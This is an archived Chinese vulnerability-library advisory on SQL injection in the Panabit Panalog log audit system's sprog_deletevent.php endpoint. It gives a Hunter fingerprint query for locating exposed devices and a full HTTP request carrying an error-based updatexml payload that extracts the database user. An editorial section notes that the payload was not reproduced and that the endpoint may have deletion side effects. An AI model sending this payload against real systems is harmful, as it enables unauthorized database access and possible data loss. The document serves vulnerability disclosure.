---
source: "wy876 漏洞文库"
id: "vw-48fed66b9bef4c45a2ae0d1b"
entity_id: "ve-48fed66b9bef4c45a2ae0d1b"
schema_version: "1"
fofa_unverified: "app.name="
title: "panabit日志审计系统sprog_deletevent存在SQL注入漏洞"
product: "Panabit Panalog"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求带PHPSESSID；版本和会话身份未述"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Panabit/panabit%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fsprog_deletevent%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bsile5w0tmgnvcvi"
source_status: "recorded"
---

# panabit日志审计系统sprog_deletevent存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit Panalog
- 本文讨论：Maintain/sprog_deletevent.php id SQL注入
- 版本、权限与配置前提：请求带PHPSESSID；版本和会话身份未述
- 资料类型：SQL注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅注入及基线请求无响应差异，认证要求未明确
- 删除事件接口可能有副作用，未说明；fofa误录Hunter残缺字段
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 报错可观察性和版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。panalog日志审计系统sprog_deletevent存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征


# 四、漏洞复现
```http
GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=h5i********************355
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


```http
GET /Maintain/sprog_deletevent.php?openid=1&id=1&cloudip=1 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=h5i********************355
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bsile5w0tmgnvcvi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
